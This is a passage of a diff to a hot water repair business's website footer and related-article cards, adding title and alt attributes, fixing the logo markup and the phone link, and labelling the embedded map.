+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-solahart-owned-by-rheem-326870.jpg?key=VJSrIQ" alt="Is Solahart owned by Rheem?" class="rounded"
                                  width="80" height="80">
                             <a href="is-solahart-owned-by-rheem.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is Solahart owned by Rheem?
@@ -692,7 +694,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-inspect-a-water-heater-326871.jpg?key=Gy1pD5" alt="How to inspect a water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-inspect-a-water-heater-326871.jpg?key=RouAoD" alt="How to inspect a water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="how-to-inspect-a-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How to inspect a water heater?
@@ -724,14 +726,16 @@
             <div class="row g-lg-3">
                 <div class="col-12 col-lg-7 col-xl-7">
                     <div class="vstack gap-5">
-                        <a class="navbar-brand m-0 gap-2 align-items-center" href="index.html">
-                            <!-- Brand Logo/Mark -->
-                            <img fetchpriority="low" async="true" defer="true"
-                                 display: none " src="logo.png" onerror="this.remove()"
-                            height="100" />
-                            <!-- Brand Name -->
-                            <p class="fs-5 fw-medium">Hot Water Experts Sydney</p>
-                        </a>
+                        <div class="d-inline-flex gap-2 align-items-center">
+                            <a class="navbar-brand m-0 gap-2 align-items-center" href="index.html">
+                                <!-- Brand Logo/Mark -->
+                                <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true"
+                                     style="display: inherit" src="logo.png" onerror="this.remove()"
+                                     height="100" />
+                                <!-- Brand Name -->
+                                <p class="fs-5 fw-medium">Hot Water Experts Sydney</p>
+                            </a>
+                        </div>
 
                         <div style="display: ">
                             <strong>Address:</strong>
@@ -741,14 +745,14 @@
                         <div style="display: ">
                             <strong>Contact:</strong>
                             <p class="mb-0">
-                                <a href="tel:+18001234567">0490 414 794</a>
+                                <a href="tel:0490 414 794" title="Contact Number">0490 414 794</a>
                                 <br>
-                                <a style="display: " href="mailto:info@hotwaterexpertssydney.com.au">info@hotwaterexpertssydney.com.au</a>
+                                <a style="display: " title="Email Address" href="mailto:info@hotwaterexpertssydney.com.au">info@hotwaterexpertssydney.com.au</a>
                             </p>
                         </div>
 
                         <div class="d-inline-flex gap-4" style="display: none">
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href=""  title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-facebook" viewBox="0 0 16 16">
                                     <path
@@ -756,14 +760,14 @@
                                 </svg>
                             </a>
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-instagram" viewBox="0 0 16 16">
                                     <path
                                             d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.9 3.9 0 0 0-1.417.923A3.9 3.9 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.9 3.9 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.9 3.9 0 0 0-.923-1.417A3.9 3.9 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599s.453.546.598.92c.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.5 2.5 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.5 2.5 0 0 1-.92-.598 2.5 2.5 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233s.008-2.388.046-3.231c.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92s.546-.453.92-.598c.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92m-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217m0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334" />
                                 </svg>
                             </a>
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Twitter Link" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-twitter-x" viewBox="0 0 16 16">
                                     <path
@@ -771,7 +775,7 @@
                                 </svg>
                             </a>
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-pinterest-x" viewBox="0 0 496 512">
                                     <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -780,7 +784,7 @@
                             </a>
 
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
                                      class="bi bi-youtube" viewBox="0 0 16 16">
                                     <path
@@ -795,9 +799,8 @@
                     <div class="row">
                         <div class="col-12 col-lg-12 align-self-center">
                             <div class="card h-50 border-0 p-0 bg-section-light" style="display: ">
-                                <iframe
-                                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau"
-                                        class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
+                                <iframe title="Locate Us"
+                                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau" class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
                                         referrerpolicy="no-referrer-when-downgrade"></iframe>
                             </div>
                         </div>
@@ -812,7 +815,6 @@
                 <a href="privacy.html" class="text-start" style="display: inherit">Privacy Policy</a>
                 <a href="terms.html" class="text-center mx-md-4" style="display: inherit">Terms of Service</a>
                 <a href="sitemap.html" class="text-center mx-md-4" style="display: inherit">Sitemap</a>
-
             </div>
         </div>
     </div>
